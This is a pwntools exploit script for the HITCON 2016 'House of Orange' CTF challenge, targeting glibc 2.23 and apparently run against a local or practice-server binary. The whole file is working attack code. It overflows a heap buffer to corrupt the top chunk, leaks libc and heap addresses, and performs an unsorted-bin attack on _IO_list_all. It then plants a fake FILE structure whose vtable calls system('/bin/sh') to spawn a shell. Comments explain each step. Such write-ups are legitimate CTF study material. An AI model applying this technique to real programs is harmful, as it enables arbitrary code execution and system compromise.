from pwn import *

context.log_level = 'debug'

pn = './houseoforange_hitcon_2016'
p = process(pn)
#p = remote('node4.buuoj.cn', 28304)
elf = ELF(pn)
libc = ELF('libc-2.23.so')

def alloc(size, name, price, color):
    p.sendlineafter(b'Your choice : ', b'1')
    p.sendlineafter(b'Length of name :', str(size).encode())
    p.sendafter(b'Name :', name)
    p.sendlineafter(b'Price of Orange:', str(price).encode())
    p.sendlineafter(b'Color of Orange:', str(color).encode())

def edit(size, name, price, color):
    p.sendlineafter(b'Your choice : ', b'3')
    p.sendlineafter(b'Length of name :', str(size).encode())
    p.sendafter(b'Name:', name)
    p.sendlineafter(b'Price of Orange:', str(price).encode())
    p.sendlineafter(b'Color of Orange:', str(color).encode())

def show():
    p.sendlineafter(b'choice : ', b'2')

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/64/libc-2.23.debug.so
    ''' + s)
    pause()

#house of orange
alloc(0x30, b'a' * 0x30, 1, 1)
payload = b'a' * 0x30 + p64(0) + p64(0x21) + p64(0x1) + p64(31) + p64(0) + p64(0xf81)
edit(len(payload), payload, 1, 1)

#old top chunk to unsorted bin
alloc(0x1000, b'a', 1, 1)


#now, unosrted bin[0]'s fd -> main_arena + 0x60, bk -> main_arena + 0x60
#when alloc a new chunk, fd and bk will not be replaced with NULL thus we could leak libc
#cause we alloc a chunk with size 0x400, it in range of large bin, when unlink to unsorted bin
#fd_next and bk_next will be replaced with real heap addr
alloc(0x400, b'a' * 8, 1, 1)

debug('')
show()

#leak libc
libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 1640 - 0x10 - libc.sym['__malloc_hook']
io_list_all = libc_base + libc.sym['_IO_list_all']

success('libc_base -> {}'.format(hex(libc_base)))
success('io_list_all -> {}'.format(hex(io_list_all)))

edit(0x10, b'a' * 0x10, 1, 1)
show()

#leak heap
heap = u64(p.recv(0x26)[0x20:0x26].ljust(8, b'\x00')) - 0xe0
success('heap -> {}'.format(hex(heap)))

#unsorted bin attack
#firstly, overwrite unosrted bin[0]'s size to 0x61, and place a fake file struct here
#overwrite unosrted bin[0]'s bk to io_list_all - 0x10, so that io_list_all will be replaced with main_arena + 0x58 when alloc next time
#after that, glibc will check unsorted bin[1], which is io_list_all - 0x10, but it's not a appropriate chunk
#it will cause a fault, lead program to exit, but while exitting, glibc will call all file's overflow function which be listed in vtable
#file struct is a link, io_list_all's next node is io_list_all's chain, in offset 0x68, main_arena + 0x58 + 0x68 = main_arena + 0xc0
#which is small bin[0]
#let's think back, glibc will place unosrted bin's node into a suitable bins
#cause we overwrite unsorted bin[0]'s size to 0x61, so it will be placed to small bin[0]
#after all, io_list_all's next node's pointer is small bin[0], and it's also a fake file, vtable's overflow function -> system
#getshell
payload = b'a' * 0x400 + p64(0) + p64(0x21) + p32(1) + p32(31) + p64(0)
fake_file = b'/bin/sh\x00' + p64(0x61)
fake_file += p64(0) + p64(io_list_all - 0x10)
fake_file += p64(0) + p64(1)
fake_file = fake_file.ljust(0xc0, b'\x00')
fake_file += p64(0) * 3
fake_file += p64(heap + 0x5e8) #vtable -> fake_vtable
fake_file += p64(0) * 2
fake_file += p64(libc_base + libc.sym['system']) #overflow
payload += fake_file

edit(len(payload), payload, 1, 1)

p.sendlineafter(b'choice : ', b'1')
p.interactive()
